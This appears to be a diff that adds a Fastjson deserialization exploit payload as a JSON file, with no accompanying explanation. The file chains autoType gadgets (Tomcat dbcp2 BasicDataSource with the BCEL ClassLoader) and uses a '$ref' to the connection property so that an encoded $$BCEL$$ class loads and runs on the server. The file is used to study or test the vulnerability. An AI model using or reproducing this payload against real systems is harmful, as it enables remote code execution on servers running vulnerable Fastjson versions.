@@ -1,0 +1,26 @@
+{
+    "name":
+    {
+        "@type" : "java.lang.Class",
+        "val"   : "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"
+    },
+    "x" : {
+        "name": {
+            "@type" : "java.lang.Class",
+            "val"   : "com.sun.org.apache.bcel.internal.util.ClassLoader"
+        },
+        "y": {
+            "@type":"com.alibaba.fastjson.JSONObject",
+            "c": {
+                "@type":"org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
+                "driverClassLoader": {
+                    "@type" : "com.sun.org.apache.bcel.internal.util.ClassLoader"
+                },
+                "driverClassName":"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$cdN$db$40$Y$9cM$9c8v$cdO$T$C$z$f4$8f$96$b6$a1H$e4$c01$a8$97$8a$5ej$a0j$wz$e8i$b3$5d$b9$h$i$3br$9c$887$ea9$X$40$i$fa$A$7d$u$c4$ac$8b$S$q$b0$b4$fb$f9$9b$9d$f9f$d6$few$7d$f5$X$c0$k$de$f9p$f1$d4$c7$3a6jxf$ebs$X$_$5c$bct$f1J$a0$bao$S$93$7f$U$u$b7$b6O$E$9cO$e9$_$z$b0$U$9aD$l$8d$H$3d$9d$7d$97$bd$98H$3dL$95$8cOdfl$7f$L$3a$f9o3$e2$8c$f0$60b$e2$O$fb$814$89$c0j$ebg$d8$97$T$d9$8ee$S$b5$bbyf$92$a8SL$97YD$7e$e3$81c$B$ff$e0L$e9an$d2$84$94$da$be$8ao$83$zts$a9N$P$e5$b00etR$bb$e98S$fa$b3$b1$n$3ck$bek$H$G$a8$c1s$b1$Z$e05$dep$G$D$ab$5d$7d$a6$Dl$e1$zm$e7$a63$xf$b2r$81$e5$f9$e1q$af$afU$$$f0x$O$7d$h$t$b9$Z$d0$cc$8ft$3ek$9a$ad$ed$f0$k$c7$7e$Gz$w$81$f7$ad$H$be$c2$j$e8k$96$w$3d$gu$b0$89$w$7f$91$7d$ca$Q$f6$O$dc$7dvmV$c1Z$f9p$B1$e5K$J$8f$b8W$LP$m$e0$k$fc$t$60$B$8b$ac$k$96$b0L$96$V$ef$U$i$dc$X$Gw$84$bc$q$ea$ac$N$$$87$5d$85$ee$x3$ffc$ea$yk$f1$S$a5z$f9$i$ce$8f$3fp$beL$L$cc$e3$84$K$f3$da$b9uj$ad$de$e3$z$82$oL$ad$f0$uq5$b9$5c$94B$X$ab$d6n$ad$80$9f$dc$A$trT$K$9d$C$A$A",
+
+                     "$ref": "$.x.y.c.connection"
+
+            }
+        }
+    }
+}
